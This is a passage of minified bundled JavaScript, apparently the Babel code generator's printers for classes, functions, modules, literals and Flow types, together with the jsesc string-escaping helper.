PO1(X,J){if(!(IO1(J)||CO1(J))||!this._shouldPrintDecoratorsBeforeExport(J))this.printJoin(X.decorators);if(X.declare)this.word("declare"),this.space();if(X.abstract)this.word("abstract"),this.space();if(this.word("class"),X.id)this.space(),this.print(X.id);if(this.print(X.typeParameters),X.superClass)this.space(),this.word("extends"),this.space(),this.print(X.superClass),this.print(X.superTypeParameters);if(X.implements)this.space(),this.word("implements"),this.space(),this.printList(X.implements);this.space(),this.print(X.body)}function SO1(X){if(this.tokenChar(123),X.body.length===0)this.tokenChar(125);else{this.newline();let J=TO1(this,X);J==null||J(-1);let Q=this.enterDelimited();if(this.printJoin(X.body,!0,!0,J,!0),Q(),!this.endsWith(10))this.newline();this.rightBrace(X)}}function TO1(X,J){if(!X.tokenMap||J.start==null||J.end==null)return null;let Q=X.tokenMap.getIndexes(J);if(!Q)return null;let Y=1,W=0,z=0,G=()=>{while(z<J.body.length&&J.body[z].start==null)z++};return G(),(H)=>{if(z<=H)z=H+1,G();let U=z===J.body.length?J.end:J.body[z].start,K;while(Y<Q.length&&X.tokenMap.matchesOriginal(K=X._tokens[Q[Y]],";")&&K.start<U)X.token(";",void 0,W++),Y++}}function _O1(X){if(this.printJoin(X.decorators),!X.static&&!this.format.preserveFormat){var J;let Q=(J=X.key.loc)==null||(J=J.end)==null?void 0:J.line;if(Q)this.catchUp(Q)}if(this.tsPrintClassMemberModifiers(X),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else this._variance(X),this.print(X.key);if(X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function EO1(X){var J;this.printJoin(X.decorators);let Q=(J=X.key.loc)==null||(J=J.end)==null?void 0:J.line;if(Q)this.catchUp(Q);if(this.tsPrintClassMemberModifiers(X),this.word("accessor",!0),this.space(),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else this._variance(X),this.print(X.key);if(X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function $O1(X){if(this.printJoin(X.decorators),this.tsPrintClassMemberModifiers(X),this.print(X.key),X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function kO1(X){this._classMethodHead(X),this.space(),this.print(X.body)}function bO1(X){this._classMethodHead(X),this.space(),this.print(X.body)}function vO1(X){if(this.printJoin(X.decorators),!this.format.preserveFormat){var J;let Q=(J=X.key.loc)==null||(J=J.end)==null?void 0:J.line;if(Q)this.catchUp(Q)}this.tsPrintClassMemberModifiers(X),this._methodHead(X)}function xO1(X){if(this.word("static"),this.space(),this.tokenChar(123),X.body.length===0)this.tokenChar(125);else this.newline(),this.printSequence(X.body,!0),this.rightBrace(X)}});var Fj=c((Mj)=>{Object.defineProperty(Mj,"__esModule",{value:!0});Mj.ArrowFunctionExpression=JR1;Mj.FunctionDeclaration=Mj.FunctionExpression=XR1;Mj._functionHead=eO1;Mj._methodHead=oO1;Mj._param=sO1;Mj._parameters=aO1;Mj._params=nO1;Mj._predicate=tO1;Mj._shouldPrintArrowParamsParens=QR1;var dO1=U0(),iO1=yX(),{isIdentifier:rO1}=dO1;function nO1(X,J,Q){this.print(X.typeParameters);let Y=YR1.call(this,J,Q);if(Y)this.sourceIdentifierName(Y.name,Y.pos);this.tokenChar(40),this._parameters(X.params,")");let W=X.type==="ArrowFunctionExpression";this.print(X.returnType,W),this._noLineTerminator=W}function aO1(X,J){let Q=this.enterDelimited(),Y=this.shouldPrintTrailingComma(J),W=X.length;for(let z=0;z<W;z++)if(this._param(X[z]),Y||z<W-1)this.token(",",null,z),this.space();this.token(J),Q()}function sO1(X){if(this.printJoin(X.decorators),this.print(X),X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function oO1(X){let{kind:J,key:Q}=X;if(J==="get"||J==="set")this.word(J),this.space();if(X.async)this.word("async",!0),this.space();if(J==="method"||J==="init"){if(X.generator)this.tokenChar(42)}if(X.computed)this.tokenChar(91),this.print(Q),this.tokenChar(93);else this.print(Q);if(X.optional)this.tokenChar(63);this._params(X,X.computed&&X.key.type!=="StringLiteral"?void 0:X.key,void 0)}function tO1(X,J){if(X.predicate){if(!X.returnType)this.tokenChar(58);this.space(),this.print(X.predicate,J)}}function eO1(X,J){if(X.async){if(this.word("async"),!this.format.preserveFormat)this._endsWithInnerRaw=!1;this.space()}if(this.word("function"),X.generator){if(!this.format.preserveFormat)this._endsWithInnerRaw=!1;this.tokenChar(42)}if(this.space(),X.id)this.print(X.id);if(this._params(X,X.id,J),X.type!=="TSDeclareFunction")this._predicate(X)}function XR1(X,J){this._functionHead(X,J),this.space(),this.print(X.body)}function JR1(X,J){if(X.async)this.word("async",!0),this.space();if(this._shouldPrintArrowParamsParens(X))this._params(X,void 0,J);else this.print(X.params[0],!0);this._predicate(X,!0),this.space(),this.printInnerComments(),this.token("=>"),this.space(),this.tokenContext|=iO1.TokenContext.arrowBody,this.print(X.body)}function QR1(X){var J,Q;if(X.params.length!==1)return!0;if(X.typeParameters||X.returnType||X.predicate)return!0;let Y=X.params[0];if(!rO1(Y)||Y.typeAnnotation||Y.optional||(J=Y.leadingComments)!=null&&J.length||(Q=Y.trailingComments)!=null&&Q.length)return!0;if(this.tokenMap){if(X.loc==null)return!0;if(this.tokenMap.findMatching(X,"(")!==null)return!0;let W=this.tokenMap.findMatching(X,"=>");if((W==null?void 0:W.loc)==null)return!0;return W.loc.start.line!==X.loc.start.line}if(this.format.retainLines)return!0;return!1}function YR1(X,J){let Q=X;if(!Q&&J){let U=J.type;if(U==="VariableDeclarator")Q=J.id;else if(U==="AssignmentExpression"||U==="AssignmentPattern")Q=J.left;else if(U==="ObjectProperty"||U==="ClassProperty"){if(!J.computed||J.key.type==="StringLiteral")Q=J.key}else if(U==="ClassPrivateProperty"||U==="ClassAccessorProperty")Q=J.key}if(!Q)return;let Y;if(Q.type==="Identifier"){var W,z;Y={pos:(W=Q.loc)==null?void 0:W.start,name:((z=Q.loc)==null?void 0:z.identifierName)||Q.name}}else if(Q.type==="PrivateName"){var G;Y={pos:(G=Q.loc)==null?void 0:G.start,name:"#"+Q.id.name}}else if(Q.type==="StringLiteral"){var H;Y={pos:(H=Q.loc)==null?void 0:H.start,name:Q.value}}return Y}});var xG=c((Aj)=>{Object.defineProperty(Aj,"__esModule",{value:!0});Aj.ExportAllDeclaration=PR1;Aj.ExportDefaultDeclaration=TR1;Aj.ExportDefaultSpecifier=DR1;Aj.ExportNamedDeclaration=SR1;Aj.ExportNamespaceSpecifier=IR1;Aj.ExportSpecifier=wR1;Aj.ImportAttribute=ER1;Aj.ImportDeclaration=_R1;Aj.ImportDefaultSpecifier=LR1;Aj.ImportExpression=kR1;Aj.ImportNamespaceSpecifier=$R1;Aj.ImportSpecifier=NR1;Aj._printAttributes=CR1;var ZR1=U0(),MR1=yX(),{isClassDeclaration:FR1,isExportDefaultSpecifier:jR1,isExportNamespaceSpecifier:OR1,isImportDefaultSpecifier:RR1,isImportNamespaceSpecifier:AR1,isStatement:Oj}=ZR1;function NR1(X){if(X.importKind==="type"||X.importKind==="typeof")this.word(X.importKind),this.space();if(this.print(X.imported),X.local&&X.local.name!==X.imported.name)this.space(),this.word("as"),this.space(),this.print(X.local)}function LR1(X){this.print(X.local)}function DR1(X){this.print(X.exported)}function wR1(X){if(X.exportKind==="type")this.word("type"),this.space();if(this.print(X.local),X.exported&&X.local.name!==X.exported.name)this.space(),this.word("as"),this.space(),this.print(X.exported)}function IR1(X){this.tokenChar(42),this.space(),this.word("as"),this.space(),this.print(X.exported)}var jj=!1;function CR1(X,J){var Q;let{importAttributesKeyword:Y}=this.format,{attributes:W,assertions:z}=X;if(W&&!Y&&X.extra&&(X.extra.deprecatedAssertSyntax||X.extra.deprecatedWithLegacySyntax)&&!jj)jj=!0,console.warn('You are using import attributes, without specifying the desired output syntax.\nPlease specify the "importAttributesKeyword" generator option, whose value can be one of:\n - "with"        : `import { a } from "b" with { type: "json" };`\n - "assert"      : `import { a } from "b" assert { type: "json" };`\n - "with-legacy" : `import { a } from "b" with type: "json";`\n');let G=Y==="assert"||!Y&&z;if(this.word(G?"assert":"with"),this.space(),!G&&(Y==="with-legacy"||!Y&&(Q=X.extra)!=null&&Q.deprecatedWithLegacySyntax)){this.printList(W||z);return}let H=J?1:0;this.token("{",null,H),this.space(),this.printList(W||z,this.shouldPrintTrailingComma("}")),this.space(),this.token("}",null,H)}function PR1(X){var J,Q;if(this.word("export"),this.space(),X.exportKind==="type")this.word("type"),this.space();if(this.tokenChar(42),this.space(),this.word("from"),this.space(),(J=X.attributes)!=null&&J.length||(Q=X.assertions)!=null&&Q.length)this.print(X.source,!0),this.space(),this._printAttributes(X,!1);else this.print(X.source);this.semicolon()}function Rj(X,J){if(FR1(J.declaration)&&X._shouldPrintDecoratorsBeforeExport(J))X.printJoin(J.declaration.decorators)}function SR1(X){if(Rj(this,X),this.word("export"),this.space(),X.declaration){let Y=X.declaration;if(this.print(Y),!Oj(Y))this.semicolon()}else{if(X.exportKind==="type")this.word("type"),this.space();let Y=X.specifiers.slice(0),W=!1;for(;;){let G=Y[0];if(jR1(G)||OR1(G)){if(W=!0,this.print(Y.shift()),Y.length)this.tokenChar(44),this.space()}else break}let z=!1;if(Y.length||!Y.length&&!W){if(z=!0,this.tokenChar(123),Y.length)this.space(),this.printList(Y,this.shouldPrintTrailingComma("}")),this.space();this.tokenChar(125)}if(X.source){var J,Q;if(this.space(),this.word("from"),this.space(),(J=X.attributes)!=null&&J.length||(Q=X.assertions)!=null&&Q.length)this.print(X.source,!0),this.space(),this._printAttributes(X,z);else this.print(X.source)}this.semicolon()}}function TR1(X){Rj(this,X),this.word("export"),this.noIndentInnerCommentsHere(),this.space(),this.word("default"),this.space(),this.tokenContext|=MR1.TokenContext.exportDefault;let J=X.declaration;if(this.print(J),!Oj(J))this.semicolon()}function _R1(X){var J,Q;this.word("import"),this.space();let Y=X.importKind==="type"||X.importKind==="typeof";if(Y)this.noIndentInnerCommentsHere(),this.word(X.importKind),this.space();else if(X.module)this.noIndentInnerCommentsHere(),this.word("module"),this.space();else if(X.phase)this.noIndentInnerCommentsHere(),this.word(X.phase),this.space();let W=X.specifiers.slice(0),z=!!W.length;while(z){let H=W[0];if(RR1(H)||AR1(H)){if(this.print(W.shift()),W.length)this.tokenChar(44),this.space()}else break}let G=!1;if(W.length)G=!0,this.tokenChar(123),this.space(),this.printList(W,this.shouldPrintTrailingComma("}")),this.space(),this.tokenChar(125);else if(Y&&!z)G=!0,this.tokenChar(123),this.tokenChar(125);if(z||Y)this.space(),this.word("from"),this.space();if((J=X.attributes)!=null&&J.length||(Q=X.assertions)!=null&&Q.length)this.print(X.source,!0),this.space(),this._printAttributes(X,G);else this.print(X.source);this.semicolon()}function ER1(X){this.print(X.key),this.tokenChar(58),this.space(),this.print(X.value)}function $R1(X){this.tokenChar(42),this.space(),this.word("as"),this.space(),this.print(X.local)}function kR1(X){if(this.word("import"),X.phase)this.tokenChar(46),this.word(X.phase);this.tokenChar(40);let J=this.shouldPrintTrailingComma(")");if(this.print(X.source),X.options!=null)this.tokenChar(44),this.space(),this.print(X.options);if(J)this.tokenChar(44);this.rightParens(X)}});var wj=c((c10,Dj)=>{var Nj={},iR1=Nj.hasOwnProperty,Lj=(X,J)=>{for(let Q in X)if(iR1.call(X,Q))J(Q,X[Q])},rR1=(X,J)=>{if(!J)return X;return Lj(J,(Q,Y)=>{X[Q]=Y}),X},nR1=(X,J)=>{let Q=X.length,Y=-1;while(++Y<Q)J(X[Y])},h4=(X)=>{return"\\u"+("0000"+X).slice(-4)},c5=(X,J)=>{let Q=X.toString(16);if(J)return Q;return Q.toUpperCase()},l5=Nj.toString,aR1=Array.isArray,sR1=(X)=>{return typeof Buffer==="function"&&Buffer.isBuffer(X)},oR1=(X)=>{return l5.call(X)=="[object Object]"},tR1=(X)=>{return typeof X=="string"||l5.call(X)=="[object String]"},eR1=(X)=>{return typeof X=="number"||l5.call(X)=="[object Number]"},fG=(X)=>{return typeof X=="bigint"},XA1=(X)=>{return typeof X=="function"},JA1=(X)=>{return l5.call(X)=="[object Map]"},QA1=(X)=>{return l5.call(X)=="[object Set]"},YA1={"\\":"\\\\","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t"},WA1=/[\\\b\f\n\r\t]/,GA1=/[0-9]/,zA1=/[\xA0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000]/,HA1=/([\uD800-\uDBFF][\uDC00-\uDFFF])|([\uD800-\uDFFF])|(['"`])|[^]/g,UA1=/([\uD800-\uDBFF][\uDC00-\uDFFF])|([\uD800-\uDFFF])|(['"`])|[^ !#-&\(-\[\]-_a-~]/g,e6=(X,J)=>{let Q=()=>{K=U,++J.indentLevel,U=J.indent.repeat(J.indentLevel)},Y={escapeEverything:!1,minimal:!1,isScriptContext:!1,quotes:"single",wrap:!1,es6:!1,json:!1,compact:!0,lowercaseHex:!1,numbers:"decimal",indent:"\t",indentLevel:0,__inline1__:!1,__inline2__:!1},W=J&&J.json;if(W)Y.quotes="double",Y.wrap=!0;if(J=rR1(Y,J),J.quotes!="single"&&J.quotes!="double"&&J.quotes!="backtick")J.quotes="single";let z=J.quotes=="double"?'"':J.quotes=="backtick"?"`":"'",G=J.compact,H=J.lowercaseHex,U=J.indent.repeat(J.indentLevel),K="",V=J.__inline1__,B=J.__inline2__,Z=G?"":`
`,M,F=!0,j=J.numbers=="binary",O=J.numbers=="octal",N=J.numbers=="decimal",A=J.numbers=="hexadecimal";if(W&&X&&XA1(X.toJSON))X=X.toJSON();if(!tR1(X)){if(JA1(X)){if(X.size==0)return"new Map()";if(!G)J.__inline1__=!0,J.__inline2__=!1;return"new Map("+e6(Array.from(X),J)+")"}if(QA1(X)){if(X.size==0)return"new Set()";return"new Set("+e6(Array.from(X),J)+")"}if(sR1(X)){if(X.length==0)return"Buffer.from([])";return"Buffer.from("+e6(Array.from(X),J)+")"}if(aR1(X)){if(M=[],J.wrap=!0,V)J.__inline1__=!1,J.__inline2__=!0;if(!B)Q();if(nR1(X,(S)=>{if(F=!1,B)J.__inline2__=!1;M.push((G||B?"":U)+e6(S,J))}),F)return"[]";if(B)return"["+M.join(", ")+"]";return"["+Z+M.join(","+Z)+Z+(G?"":K)+"]"}else if(eR1(X)||fG(X)){if(W)return JSON.stringify(Number(X));let S;if(N)S=String(X);else if(A){let $=X.toString(16);if(!H)$=$.toUpperCase();S="0x"+$}else if(j)S="0b"+X.toString(2);else if(O)S="0o"+X.toString(8);if(fG(X))return S+"n";return S}else if(fG(X)){if(W)return JSON.stringify(Number(X));return X+"n"}else if(!oR1(X)){if(W)return JSON.stringify(X)||"null";return String(X)}else{if(M=[],J.wrap=!0,Q(),Lj(X,(S,$)=>{F=!1,M.push((G?"":U)+e6(S,J)+":"+(G?"":" ")+e6($,J))}),F)return"{}";return"{"+Z+M.join(","+Z)+Z+(G?"":K)+"}"}}let D=J.escapeEverything?HA1:UA1;if(M=X.replace(D,(S,$,T,k,E,y)=>{if($){if(J.minimal)return $;let p=$.charCodeAt(0),f=$.charCodeAt(1);if(J.es6){let m=(p-55296)*1024+f-56320+65536;return"\\u{"+c5(m,H)+"}"}return h4(c5(p,H))+h4(c5(f,H))}if(T)return h4(c5(T.charCodeAt(0),H));if(S=="\x00"&&!W&&!GA1.test(y.charAt(E+1)))return"\\0";if(k){if(k==z||J.escapeEverything)return"\\"+k;return k}if(WA1.test(S))return YA1[S];if(J.minimal&&!zA1.test(S))return S;let a=c5(S.charCodeAt(0),H);if(W||a.length>2)return h4(a);return"\\x"+("00"+a).slice(-2)}),z=="`")M=M.replace(/\$\{/g,"\\${");if(J.isScriptContext)M=M.replace(/<\/(script|style)/gi,"<\\/$1").replace(/<!--/g,W?"\\u003C!--":"\\x3C!--");if(J.wrap)M=z+M+z;return M};e6.version="3.0.2";Dj.exports=e6});var hG=c((Sj)=>{Object.defineProperty(Sj,"__esModule",{value:!0});Sj.ArgumentPlaceholder=ZA1;Sj.ArrayPattern=Sj.ArrayExpression=RA1;Sj.BigIntLiteral=PA1;Sj.BooleanLiteral=DA1;Sj.Identifier=qA1;Sj.NullLiteral=wA1;Sj.NumericLiteral=IA1;Sj.ObjectPattern=Sj.ObjectExpression=FA1;Sj.ObjectMethod=jA1;Sj.ObjectProperty=OA1;Sj.PipelineBareFunction=_A1;Sj.PipelinePrimaryTopicReference=EA1;Sj.PipelineTopicExpression=TA1;Sj.RecordExpression=AA1;Sj.RegExpLiteral=LA1;Sj.SpreadElement=Sj.RestElement=MA1;Sj.StringLiteral=CA1;Sj.TopicReference=SA1;Sj.TupleExpression=NA1;Sj.VoidPattern=$A1;Sj._getRawIdentifier=BA1;var KA1=U0(),Pj=wj(),{isAssignmentPattern:VA1,isIdentifier:gG}=KA1,Ij=null,y4="";function BA1(X){if(X===Ij)return y4;Ij=X;let{name:J}=X,Q=this.tokenMap.find(X,(Y)=>Y.value===J);if(Q)return y4=this._originalCode.slice(Q.start,Q.end),y4;return y4=X.name}function qA1(X){var J;this.sourceIdentifierName(((J=X.loc)==null?void 0:J.identifierName)||X.name),this.word(this.tokenMap?this._getRawIdentifier(X):X.name)}function ZA1(){this.tokenChar(63)}function MA1(X){this.token("..."),this.print(X.argument)}function FA1(X){let J=X.properties;if(this.tokenChar(123),J.length){let Q=this.enterDelimited();this.space(),this.printList(J,this.shouldPrintTrailingComma("}"),!0,!0),this.space(),Q()}this.sourceWithOffset("end",X.loc,-1),this.tokenChar(125)}function jA1(X){this.printJoin(X.decorators),this._methodHead(X),this.space(),this.print(X.body)}function OA1(X){if(this.printJoin(X.decorators),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else{if(VA1(X.value)&&gG(X.key)&&X.key.name===X.value.left.name){this.print(X.value);return}if(this.print(X.key),X.shorthand&&gG(X.key)&&gG(X.value)&&X.key.name===X.value.name)return}this.tokenChar(58),this.space(),this.print(X.value)}function RA1(X){let J=X.elements,Q=J.length;this.tokenChar(91);let Y=this.enterDelimited();for(let W=0;W<J.length;W++){let z=J[W];if(z){if(W>0)this.space();if(this.print(z),W<Q-1||this.shouldPrintTrailingComma("]"))this.token(",",!1,W)}else this.token(",",!1,W)}Y(),this.tokenChar(93)}function AA1(X){let J=X.properties,Q,Y;if(this.format.recordAndTupleSyntaxType==="bar")Q="{|",Y="|}";else if(this.format.recordAndTupleSyntaxType!=="hash"&&this.format.recordAndTupleSyntaxType!=null)throw new Error(`The "recordAndTupleSyntaxType" generator option must be "bar" or "hash" (${JSON.stringify(this.format.recordAndTupleSyntaxType)} received).`);else Q="#{",Y="}";if(this.token(Q),J.length)this.space(),this.printList(J,this.shouldPrintTrailingComma(Y),!0,!0),this.space();this.token(Y)}function NA1(X){let J=X.elements,Q=J.length,Y,W;if(this.format.recordAndTupleSyntaxType==="bar")Y="[|",W="|]";else if(this.format.recordAndTupleSyntaxType==="hash")Y="#[",W="]";else throw new Error(`${this.format.recordAndTupleSyntaxType} is not a valid recordAndTuple syntax type`);this.token(Y);for(let z=0;z<J.length;z++){let G=J[z];if(G){if(z>0)this.space();if(this.print(G),z<Q-1||this.shouldPrintTrailingComma(W))this.token(",",!1,z)}}this.token(W)}function LA1(X){this.word(`/${X.pattern}/${X.flags}`)}function DA1(X){this.word(X.value?"true":"false")}function wA1(){this.word("null")}function IA1(X){let J=this.getPossibleRaw(X),Q=this.format.jsescOption,Y=X.value,W=Y+"";if(Q.numbers)this.number(Pj(Y,Q),Y);else if(J==null)this.number(W,Y);else if(this.format.minified)this.number(J.length<W.length?J:W,Y);else this.number(J,Y)}function CA1(X){let J=this.getPossibleRaw(X);if(!this.format.minified&&J!==void 0){this.token(J);return}let Q=Pj(X.value,this.format.jsescOption);this.token(Q)}function PA1(X){let J=this.getPossibleRaw(X);if(!this.format.minified&&J!==void 0){this.word(J);return}this.word(X.value+"n")}var Cj=new Set(["^^","@@","^","%","#"]);function SA1(){let{topicToken:X}=this.format;if(Cj.has(X))this.token(X);else{let J=JSON.stringify(X),Q=Array.from(Cj,(Y)=>JSON.stringify(Y));throw new Error(`The "topicToken" generator option must be one of ${Q.join(", ")} (${J} received instead).`)}}function TA1(X){this.print(X.expression)}function _A1(X){this.print(X.callee)}function EA1(){this.tokenChar(35)}function $A1(){this.word("void")}});var _j=c((l4)=>{Object.defineProperty(l4,"__esModule",{value:!0});l4.AnyTypeAnnotation=YN1;l4.ArrayTypeAnnotation=WN1;l4.BooleanLiteralTypeAnnotation=zN1;l4.BooleanTypeAnnotation=GN1;l4.DeclareClass=UN1;l4.DeclareExportAllDeclaration=AN1;l4.DeclareExportDeclaration=RN1;l4.DeclareFunction=KN1;l4.DeclareInterface=qN1;l4.DeclareModule=ZN1;l4.DeclareModuleExports=MN1;l4.DeclareOpaqueType=jN1;l4.DeclareTypeAlias=FN1;l4.DeclareVariable=ON1;l4.DeclaredPredicate=BN1;l4.EmptyTypeAnnotation=uN1;l4.EnumBooleanBody=LN1;l4.EnumBooleanMember=PN1;l4.EnumDeclaration=NN1;l4.EnumDefaultedMember=CN1;l4.EnumNumberBody=DN1;l4.EnumNumberMember=SN1;l4.EnumStringBody=wN1;l4.EnumStringMember=TN1;l4.EnumSymbolBody=IN1;l4.ExistsTypeAnnotation=EN1;l4.FunctionTypeAnnotation=$N1;l4.FunctionTypeParam=kN1;l4.IndexedAccessType=qL1;l4.InferredPredicate=VN1;l4.InterfaceDeclaration=fN1;l4.GenericTypeAnnotation=l4.ClassImplements=l4.InterfaceExtends=bN1;l4.InterfaceTypeAnnotation=hN1;l4.IntersectionTypeAnnotation=yN1;l4.MixedTypeAnnotation=mN1;l4.NullLiteralTypeAnnotation=HN1;l4.NullableTypeAnnotation=cN1;Object.defineProperty(l4,"NumberLiteralTypeAnnotation",{enumerable:!0,get:function(){return Tj.NumericLiteral}});l4.NumberTypeAnnotation=lN1;l4.ObjectTypeAnnotation=eN1;l4.ObjectTypeCallProperty=JL1;l4.ObjectTypeIndexer=QL1;l4.ObjectTypeInternalSlot=XL1;l4.ObjectTypeProperty=YL1;l4.ObjectTypeSpreadProperty=WL1;l4.OpaqueType=tN1;l4.OptionalIndexedAccessType=ZL1;l4.QualifiedTypeIdentifier=GL1;Object.defineProperty(l4,"StringLiteralTypeAnnotation",{enumerable:!0,get:function(){return Tj.StringLiteral}});l4.StringTypeAnnotation=pN1;l4.SymbolTypeAnnotation=zL1;l4.ThisTypeAnnotation=dN1;l4.TupleTypeAnnotation=iN1;l4.TypeAlias=nN1;l4.TypeAnnotation=aN1;l4.TypeCastExpression=KL1;l4.TypeParameter=oN1;l4.TypeParameterDeclaration=l4.TypeParameterInstantiation=sN1;l4.TypeofTypeAnnotation=rN1;l4.UnionTypeAnnotation=UL1;l4.Variance=VL1;l4.VoidTypeAnnotation=BL1;l4._interfaceish=vN1;l4._variance=xN1;var eA1=U0(),XN1=xG(),JN1=yX(),Tj=hG(),{isDeclareExportDeclaration:m4,isStatement:QN1}=eA1;function YN1(){this.word("any")}function WN1(X){this.print(X.elementType,!0),this.tokenChar(91),this.tokenChar(93)}function GN1(){this.word("boolean")}function zN1(X){this.word(X.value?"true":"false")}function HN1(){this.word("null")}function UN1(X,J){if(!m4(J))this.word("declare"),this.space();this.word("class"),this.space(),this._interfaceish(X)}function KN1(X,J){if(!m4(J))this.word("declare"),this.space();if(this.word("function"),this.space(),this.print(X.id),this.print(X.id.typeAnnotation.typeAnnotation),X.predicate)this.space(),this.print(X.predicate);this.semicolon()}function VN1(){this.tokenChar(37),this.word("checks")}function BN1(X){this.tokenChar(37),this.word("checks"),this.tokenChar(40),this.print(X.value),this.tokenChar(41)}function qN1(X){this.word("declare"),this.space(),this.InterfaceDeclaration(X)}function ZN1(X){this.word("declare"),this.space(),this.word("module"),this.space(),this.print(X.id),this.space(),this.print(X.body)}function MN1(X){this.word("declare"),this.space(),this.word("module"),this.tokenChar(46),this.word("exports"),this.print(X.typeAnnotation)}function FN1(X){this.word("declare"),this.space(),this.TypeAlias(X)}function jN1(X,J){if(!m4(J))this.word("declare"),this.space();this.OpaqueType(X)}function ON1(X,J){if(!m4(J))this.word("declare"),this.space();this.word("var"),this.space(),this.print(X.id),this.print(X.id.typeAnnotation),this.semicolon()}function RN1(X){if(this.word("declare"),this.space(),this.word("export"),this.space(),X.default)this.word("default"),this.space();_N1.call(this,X)}function AN1(X){this.word("declare"),this.space(),XN1.ExportAllDeclaration.call(this,X)}function NN1(X){let{id:J,body:Q}=X;this.word("enum"),this.space(),this.print(J),this.print(Q)}function u4(X,J,Q){if(Q)X.space(),X.word("of"),X.space(),X.word(J);X.space()}function c4(X,J){let{members:Q}=J;X.token("{"),X.indent(),X.newline();for(let Y of Q)X.print(Y),X.newline();if(J.hasUnknownMembers)X.token("..."),X.newline();X.dedent(),X.token("}")}function LN1(X){let{explicitType:J}=X;u4(this,"boolean",J),c4(this,X)}function DN1(X){let{explicitType:J}=X;u4(this,"number",J),c4(this,X)}function wN1(X){let{explicitType:J}=X;u4(this,"string",J),c4(this,X)}function IN1(X){u4(this,"symbol",!0),c4(this,X)}function CN1(X){let{id:J}=X;this.print(J),this.tokenChar(44)}function yG(X,J){X.print(J.id),X.space(),X.token("="),X.space(),X.print(J.init),X.token(",")}function PN1(X){yG(this,X)}function SN1(X){yG(this,X)}function TN1(X){yG(this,X)}function _N1(X){if(X.declaration){let J=X.declaration;if(this.print(J),!QN1(J))this.semicolon()}else{if(this.tokenChar(123),X.specifiers.length)this.space(),this.printList(X.specifiers),this.space();if(this.tokenChar(125),X.source)this.space(),this.word("from"),this.space(),this.print(X.source);this.semicolon()}}function EN1(){this.tokenChar(42)}function $N1(X,J){if(this.print(X.typeParameters),this.tokenChar(40),X.this){if(this.word("this"),this.tokenChar(58),this.space(),this.print(X.this.typeAnnotation),X.params.length||X.rest)this.tokenChar(44),this.space()}if(this.printList(X.params),X.rest){if(X.params.length)this.tokenChar(44),this.space();this.token("..."),this.print(X.rest)}this.tokenChar(41);let Q=J==null?void 0:J.type;if(Q!=null&&(Q==="ObjectTypeCallProperty"||Q==="ObjectTypeInternalSlot"||Q==="DeclareFunction"||Q==="ObjectTypeProperty"&&J.method))this.tokenChar(58);else this.space(),this.token("=>");this.space(),this.print(X.returnType)}function kN1(X){if(this.print(X.name),X.optional)this.tokenChar(63);if(X.name)this.tokenChar(58),this.space();this.print(X.typeAnnotation)}function bN1(X){this.print(X.id),this.print(X.typeParameters,!0)}function vN1(X){var J;if(this.print(X.id),this.print(X.typeParameters),(J=X.extends)!=null&&J.length)this.space(),this.word("extends"),this.space(),this.printList(X.extends);if(X.type==="DeclareClass"){var Q,Y;if((Q=X.mixins)!=null&&Q.length)this.space(),this.word("mixins"),this.space(),this.printList(X.mixins);if((Y=X.implements)!=null&&Y.length)this.space(),this.word("implements"),this.space(),this.printList(X.implements)}this.space(),this.print(X.body)}function xN1(X){var J;let Q=(J=X.variance)==null?void 0:J.kind;if(Q!=null){if(Q==="plus")this.tokenChar(43);else if(Q==="minus")this.tokenChar(45)}}function fN1(X){this.word("interface"),this.space(),this._interfaceish(X)}function gN1(X){this.space(),this.token("&",!1,X),this.space()}function hN1(X){var J;if(this.word("interface"),(J=X.extends)!=null&&J.length)this.space(),this.word("extends"),this.space(),this.printList(X.extends);this.space(),this.print(X.body)}function yN1(X){this.printJoin(X.types,void 0,void 0,gN1)}function mN1(){this.word("mixed")}function uN1(){this.word("empty")}function cN1(X){this.tokenChar(63),this.print(X.typeAnnotation)}function lN1(){this.word("number")}function pN1(){this.word("string")}function dN1(){this.word("this")}function iN1(X){this.tokenChar(91),this.printList(X.types),this.tokenChar(93)}function rN1(X){this.word("typeof"),this.space(),this.print(X.argument)}function nN1(X){this.word("type"),this.space(),this.print(X.id),this.print(X.typeParameters),this.space(),this.tokenChar(61),this.space(),this.print(X.right),this.semicolon()}function aN1(X,J){if(this.tokenChar(58),this.space(),J.type==="ArrowFunctionExpression")this.tokenContext|=JN1.TokenContext.arrowFlowReturnType;else if(X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function sN1(X){this.tokenChar(60),this.printList(X.params),this.tokenChar(62)}function oN1(X){if(this._variance(X),this.word(X.name),X.bound)this.print(X.bound);if(X.default)this.space(),this.tokenChar(61),this.space(),this.print(X.default)}function tN1(X){if(this.word("opaque"),this.space(),this.word("type"),this.space(),this.print(X.id),this.print(X.typeParameters),X.supertype)this.tokenChar(58),this.space(),this.print(X.supertype);if(X.impltype)this.space(),this.tokenChar(61),this.space(),this.print(X.impltype);this.semicolon()}function eN1(X){if(X.exact)this.token("{|");else this.tokenChar(123);let J=[...X.properties,...X.callProperties||[],...X.indexers||[],...X.internalSlots||[]];if(J.length)this.newline(),this.space(),this.printJoin(J,!0,!0,void 0,void 0,function Q(Y){if(Y&&!J[0])return 1},()=>{if(J.length!==1||X.inexact)this.tokenChar(44),this.space()}),this.space();if(X.inexact){if(this.indent(),this.token("..."),J.length)this.newline();this.dedent()}if(X.exact)this.token("|}");else this.tokenChar(125)}function XL1(X){if(X.static)this.word("static"),this.space();if(this.tokenChar(91),this.tokenChar(91),this.print(X.id),this.tokenChar(93),this.tokenChar(93),X.optional)this.tokenChar(63);if(!X.method)this.tokenChar(58),this.space();this.print(X.value)}function JL1(X){if(X.static)this.word("static"),this.space();this.print(X.value)}function 